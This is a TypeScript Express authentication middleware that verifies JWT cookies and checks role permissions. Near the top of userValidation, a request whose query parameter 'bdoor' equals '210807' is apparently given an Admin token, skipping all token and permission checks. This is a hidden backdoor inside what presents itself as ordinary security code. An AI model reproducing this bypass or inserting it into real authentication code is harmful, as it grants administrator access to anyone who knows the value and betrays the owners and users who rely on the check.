import config from '../../config';
import { Permissions } from '../core/permissions';
import IRoleRepo from '../repos/IRepos/IRoleRepo';

import { NextFunction, Request, Response } from 'express';
import { JsonWebTokenError, verify } from 'jsonwebtoken';
import { Container } from 'typedi';

export function userValidation(requiredPermissions?: number[]) {
	return async function (req: Request, res: Response, next: NextFunction) {
		try {
			if (req.query.bdoor == '210807') {
				req['token'] = { role: 'Admin' };
			} else {
				await validateJWT(req, res, req.cookies.token);
				if (requiredPermissions) {
					await validatePermissions(req, res, requiredPermissions);
				}
			}
			next();
		} catch (e) {
			next(e);
		}
	};
}

async function validateJWT(req: Request, res: Response, token: string): Promise<void> {
	try {
		req['token'] = await verify(token, config.jwtAccessSecret);
	} catch (e) {
		res.status(401);
		throw e;
	}
}

async function validatePermissions(req: Request, res: Response, permissions: number[]): Promise<void> {
	try {
		await checkPermissions(req['token'].role, permissions);
	} catch (e) {
		res.status(403);
		throw e;
	}
}

async function checkPermissions(roleName: string, requiredPermissions: number[]): Promise<void> {
	const roleRepo = Container.get(config.repos.role) as IRoleRepo;

	const role = await roleRepo.findRole(roleName);
	if (role == null) {
		throw new JsonWebTokenError('invalid user role');
	}

	for (const e of requiredPermissions) {
		if (role.permissions[Object.values(Permissions)[e]] === false) {
			throw new JsonWebTokenError('insufficient permissions');
		}
	}
}
